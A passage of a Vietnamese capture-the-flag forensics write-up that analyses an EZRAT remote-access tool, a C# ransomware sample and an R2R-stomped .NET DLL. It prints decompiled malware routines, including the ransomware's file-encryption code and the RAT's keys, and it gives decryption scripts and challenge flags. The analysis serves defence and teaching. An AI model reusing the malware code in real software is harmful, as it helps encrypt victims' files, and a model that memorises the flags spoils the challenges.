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";
    return r
}
```
Đoạn biến `r` dài loằng ngoằng kia theo script bị RC4 encrypt với key `vF8rdgMHKBrvCoCp0ulm`, sau đó base64 encoded. Đem decrypt ta có flag bị base64 encoded

![image](https://hackmd.io/_uploads/SJyj3PD06.png)

Flag: `HTB{m4ld0cs_4r3_g3tt1ng_Tr1cki13r}`

## _Data Siege_
Trong file network capture được cho export ra 1 file `aQ4caZ.exe`. Tệp này đã được tải xuống và chạy bằng powershell

![image](https://hackmd.io/_uploads/SktmWYDC6.png)

Sau lệnh file chạy có 1 luồng dữ liệu giống base64 encoded, decode thử thì chỉ có 1 đoạn gần cuối đọc được 1 phần của flag
![image](https://hackmd.io/_uploads/rJ3oQtPR6.png)

![image](https://hackmd.io/_uploads/Hyo4EKw06.png)

Hmm [EZRAT](https://github.com/Exo-poulpe/EZRAT)

![image](https://hackmd.io/_uploads/BJeq-twCa.png)

EZRAT được viết bằng C#. Mình dùng dotPeek để phân tích. Lười cài dùng [decompiler.com](https://www.decompiler.com/) cũng được
Tập trung vào 2 phần là `EZRATClient/Program` và `EZRATClient.Utils/Constantes`. Đầu tiên là `Program`, đáng chú ý đoạn code sau
```
	public static string Encrypt(string clearText)
	{
		try
		{
			string encryptKey = Constantes.EncryptKey;
			byte[] bytes = Encoding.Default.GetBytes(clearText);
			using (Aes aes = Aes.Create())
			{
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[13]
				{
					86, 101, 114, 121, 95, 83, 51, 99, 114, 51,
					116, 95, 83
				});
				aes.Key = rfc2898DeriveBytes.GetBytes(32);
				aes.IV = rfc2898DeriveBytes.GetBytes(16);
				using MemoryStream memoryStream = new MemoryStream();
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytes, 0, bytes.Length);
					cryptoStream.Close();
				}
				clearText = Convert.ToBase64String(memoryStream.ToArray());
			}
			return clearText;
		}
		catch (Exception)
		{
			return clearText;
		}
	}

	public static string Decrypt(string cipherText)
	{
		try
		{
			string encryptKey = Constantes.EncryptKey;
			byte[] array = Convert.FromBase64String(cipherText);
			using (Aes aes = Aes.Create())
			{
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[13]
				{
					86, 101, 114, 121, 95, 83, 51, 99, 114, 51,
					116, 95, 83
				});
				aes.Key = rfc2898DeriveBytes.GetBytes(32);
				aes.IV = rfc2898DeriveBytes.GetBytes(16);
				using MemoryStream memoryStream = new MemoryStream();
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(array, 0, array.Length);
					cryptoStream.Close();
				}
				cipherText = Encoding.Default.GetString(memoryStream.ToArray());
			}
			return cipherText;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Console.WriteLine("Cipher Text: " + cipherText);
			return "error";
		}
	}
```
Trong `Constantes` tìm được EncryptKey
```
private static string _encryptKey = "VYAemVeO3zUDTL6N62kVA";
```
Dựa vào đó mình viết script python để decrypt data và lấy nốt 2 phần còn lại của flag
```
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Protocol.KDF import PBKDF2
import sys

def decrypt(cipher_text, password):
    try:
        salt = bytes([86, 101, 114, 121, 95, 83, 51, 99, 114, 51, 116, 95, 83])
        key_iv = PBKDF2(password, salt, dkLen=32+16, count=1000)
        key = key_iv[:32]
        iv = key_iv[32:32+16]
        
        # Decrypting the cipher text
        cipher_text_bytes = b64decode(cipher_text)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(cipher_text_bytes), AES.block_size)
        return decrypted.decode('utf-8')
    except Exception as e:
        print(f"An error occurred: {e}", file=sys.stderr)
        return "error"

if __name__ == "__main__":
    password = "VYAemVeO3zUDTL6N62kVA"
    
    while True:
        # User input
        user_input = input("Enter the cipher text to decrypt (or 'exit' to quit): ")
        if user_input.lower() == 'exit':
            print("Exiting...")
            break
        decrypted_text = decrypt(user_input, password)
        print("Decrypted text:", decrypted_text)
```
![image](https://hackmd.io/_uploads/H1HbTKvCp.png)

Flag: `HTB{c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5}`

## _Confinement_
Bài cho file .ad, mình dùng FTK Imager để phân tích
Mục tiêu của bài này là khôi phục lại file bị ransomware mã hóa để lấy flag. Đầu tiên mình tìm trong các thư mục thường gặp để tìm file con ransomware nhưng không thấy. Chuyển qua đọc chay log event thì cũng chỉ tìm được thông tin file `intel.exe` đã được extract ra bằng 7z, sau đó thì xóa hết luôn. ~~sadge~~

Thôi đi tìm tool ~~đọc chay hết chỗ log kia ốm luôn~~. Thì mình tìm được cái này

[![HAYABUSA](https://hackmd.io/_uploads/Sy9dmqvAp.jpg)](https://github.com/Yamato-Security/hayabusa)

Và cái này
https://thesecuritynoob.com/dfir-tools/dfir-tools-timeline-explorer-what-is-it-how-to-use/

Dùng 2 tool trên để lọc log nhanh hơn.
```
Threat: Trojan:Win32/Wacatac.B!ml ¦ Severity: Severe ¦ Type: Trojan ¦ User: DESKTOP-A1L0P1U\tommyxiaomi ¦ Path: file:_C:\Users\tommyxiaomi\Documents\intel.exe ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```
Có vẻ `intel.exe` lúc đầu chạy bị WinDef hốt luôn rồi :lul:
~~tat ca la tai AMD~~
Dùng [defender-dump](https://github.com/knez/defender-dump) dump file bị cách ly ra rồi tiến hành phân tích. Ransomware viết bằng C#, mình dùng dotPeek để decompile.
Tập trung vào 3 phần của Ransomware: `Encryptor/Program`, `Encryptor.class/PasswordHasher` và `Encryptor.class/CoreEncryptor`

* Encryptor/Program:
```
  internal class Program
  {
    private static string email1 = "fraycrypter@korp.com";
    private static string email2 = "fraydecryptsp@korp.com";
    public static readonly string alertName = "ULTIMATUM";
    private static string salt = "0f5264038205edfb1ac05fbb0e8c5e94";
    private static string email;
    private static string softwareName = "Encrypter";
    private static CoreEncrypter coreEncrypter = (CoreEncrypter) null;
    private static string UID = (string) null;

    private static void Main(string[] args)
    {
      Utility utility = new Utility();
      PasswordHasher passwordHasher = new PasswordHasher();
      if (!Dns.GetHostName().Equals("DESKTOP-A1L0P1U", StringComparison.OrdinalIgnoreCase))
        return;
      Program.UID = utility.GenerateUserID();
      utility.Write("\nUserID = " + Program.UID, ConsoleColor.Cyan);
      Alert alert = new Alert(Program.UID, Program.email1, Program.email2);
      Program.email = Program.email1 + " And " + Program.email2 + " (send both)";
      Program.coreEncrypter = new CoreEncrypter(passwordHasher.GetHashCode(Program.UID, Program.salt), alert.ValidateAlert(), Program.alertName, Program.email);
      utility.Write("\nStart ...", ConsoleColor.Red);
      Program.Enc(Environment.CurrentDirectory);
      Console.ReadKey();
    }
```
* Encryptor.class/PasswordHasher
```
{
  internal class PasswordHasher
  {
    public string GetSalt() => Guid.NewGuid().ToString("N");

    public string Hasher(string password)
    {
      using (SHA512CryptoServiceProvider cryptoServiceProvider = new SHA512CryptoServiceProvider())
      {
        byte[] bytes = Encoding.UTF8.GetBytes(password);
        return Convert.ToBase64String(cryptoServiceProvider.ComputeHash(bytes));
      }
    }

    public string GetHashCode(string password, string salt) => this.Hasher(password + salt);

    public bool CheckPassword(string password, string salt, string hashedpass)
    {
      return this.GetHashCode(password, salt) == hashedpass;
    }
  }
}
```
* Encryptor.class/CoreEncryptor
```
    public CoreEncrypter(string password, string alert, string alertName, string email)
    {
      this.password = password;
      this.alert = alert;
      this.alertName = alertName;
      this.email = email;
    }

    public void EncryptFile(string file)
    {
      byte[] buffer = new byte[(int) ushort.MaxValue];
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(this.password, new byte[8]
      {
        (byte) 0,
        (byte) 1,
        (byte) 1,
        (byte) 0,
        (byte) 1,
        (byte) 1,
        (byte) 0,
        (byte) 0
      }, 4953);
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
      rijndaelManaged.Mode = CipherMode.CBC;
      rijndaelManaged.Padding = PaddingMode.ISO10126;
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
      FileStream fileStream1 = (FileStream) null;
```
Vì mục tiêu là decrypt file để đọc flag nên tóm tắt các nội dung cần làm như sau:
* Tìm UID (là FactionID trong ransome note)
* Salt (đã có 1 trong Program và 1 trong CoreEncryptor)
* Hash dùng làm Key giải mã (tạo ra từ password(chính là UID) và Salt)

Script python giải mã file
```
import hashlib
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

password = '5K7X7E6X7V2D6F'
salt = '0f5264038205edfb1ac05fbb0e8c5e94'

def get_hash_code(password, salt):
    password_and_salt = password + salt
    sha512 = hashlib.sha512()
    sha512.update(password_and_salt.encode('utf-8'))
    return base64.b64encode(sha512.digest())

def decrypt_file(file_path, password):
        salt = b'\x00\x01\x01\x00\x01\x01\x00\x00'
        key_iv_bytes = PBKDF2(password, salt, dkLen=48, count=4953)
        key = key_iv_bytes[:32]
        iv = key_iv_bytes[32:]
        print(key.hex())
        print(iv.hex())
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_file_path = file_path[:-5]  # Remove ".korp" extension
        with open(file_path, 'rb') as encrypted_file, open(decrypted_file_path, 'wb') as decrypted_file:
            decrypted_data = cipher.decrypt(encrypted_file.read())
            decrypted_file.write(decrypted_data)

key = get_hash_code(password, salt)

encrypted_file_path = 'Applicants_info.xlsx.korp'

decrypted_content = decrypt_file(encrypted_file_path, key)
```
Chạy script và khôi phục file, ta có flag
Flag: `HTB{2_f34r_1s_4_ch01ce_322720914448bf9831435690c5835634}`

## _Oblique Final_
Bài cho 1 file `hiberfil.sys`, đây là file lưu memory của máy khi trước khi vào chế độ Hibernation trên Windows. Tìm hiểu một hồi mình tìm được [blog này](https://www.forensicxlab.com/posts/hibernation/) nói về phân tích file Hibernation. Cụ thể tác giả của blog đã mod lại tool Volatility3 để chuyển đổi file hibernation thành file memory dump để có thể phân tích trên Volatility3 như các memdump thông thường.
Cụ thể cách sử dụng như sau:
* Clone branch `feature/hibernation-layer` từ trang github của volatility3
```
git clone -b feature/hibernation-layer https://github.com/forensicxlab/volatility3.git
```
* Chạy thử để test file có khả năng convert sang memdump không
```
> python3 vol.py -f hiberfil_Win10_1507.sys windows.hibernation.Info
Volatility 3 Framework 2.5.1
Progress:  100.00               PDB scanning finished                  
Variable        Value

Signature       b'HIBR'
PageSize        4096
Comment The hibernation file header signature is correct.
System Time     2024-02-08 22:43:33
FirstBootRestorePage    0x12
NumPagesForLoader       434546
```
* Tiến hành convert sang memdump
    * Có 4 loại version: `0=>[Windows 10 1703 to Windows 11 23H2]` `1=>[Windows 8/8.1]` `2=>[Windows 10 1507 to 1511]` `3=>[Windows 10 1607]`
    * Mình nghĩ file của bài được tạo gần đây nên mình sử dụng `version 0`, và nó dùng được.
```
> python3 vol.py -f hiberfil.sys windows.hibernation.Dump --version 0
```
Sau khi dump xong ta được file `memory_layer.raw`, tiến hành sử dụng volatility3 để phân tích như bình thường
Đầu tiên mình dùng pslist để xem có tiến trình nào trông đáng nghi đang chạy, và có vẻ chỉ có `TheGame.exe` đáng quan tâm
```
> python3 vol.py -f memory_layer.raw windows.pslist      
Volatility 3 Framework 2.5.1
Progress:  100.00               PDB scanning finished                        
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output

6348    6560    TheGame.exe     0xac8d5ef4e080  8       -       2       False   2024-02-08 22:43:28.000000      N/A     Disabled
```
Tiếp theo mình dùng `filescan` để tìm tới thư mục chứa `TheGame.exe`, và tìm thấy folder `publish` ngoài Desktop, và trong đó không chỉ có `TheGame.exe` mà còn tương đối nhiều file khác. Có vẻ như `TheGame.exe` chạy phụ thuộc vào các dll, trong đó đáng nghi ngờ là file `TheGame.dll`. Tiến hành dump file này ra bằng `dumpfiles` và phân tích
Dùng DetectItEasy thấy Library là `.NET`, mình lại dùng dotPeek để phân tích, nhưng cũng chỉ thấy 1 string decode base64 ra trông như 1 file test Antivirus :v
Đây có lẽ là phần "Insane" của bài. Thực tế thì hint nằm ở đề bài với câu cuối:
> "Are you Ready To Run with the Wolves?!"
> 
Malware sử dụng kỹ thuật "R2R Stomping" (đọc thêm [ở đây](https://research.checkpoint.com/2023/r2r-stomping-are-you-ready-to-run/))
Khi này ta phải dùng [ILSpy](https://github.com/icsharpcode/ILSpy), một decompiler .NET khác có thể xem code ReadyToRun

![image](https://hackmd.io/_uploads/S1qOHZd0a.png)

Mình hiện tại chưa có kiến thức về Assembly, đọc không hiểu gì cả :Đ, nhưng đại khái thì đoạn này là .NET binary code, và để chạy được thì mình dùng hex editor dump sạch đoạn từ `1DB0` đến `357C` của `TheGame.dll` (full đoạn R2R) rồi dùng [speakeasy](https://github.com/mandiant/speakeasy) để giả lập kernel Windows chạy code binary

![image](https://hackmd.io/_uploads/H1P5bf_CT.png)

Code check tên host, đúng tên mới cho chạy tiếp. Ta sửa trong [file config này](https://github.com/mandiant/speakeasy/blob/master/speakeasy/configs/default.json) của tool từ `speakeasy_host` thành `ARCH_WORKSTATION-7` rồi chạy lại code, và ra được flag

![image](https://hackmd.io/_uploads/SyaiGGO0p.png)

Flag: `HTB{IL_st0mp1ng_4nd_h1b3rn4t10n_f0r_th3_gr4nd_f1n4l!!}`

# Tổng kết
Đau lưng :(
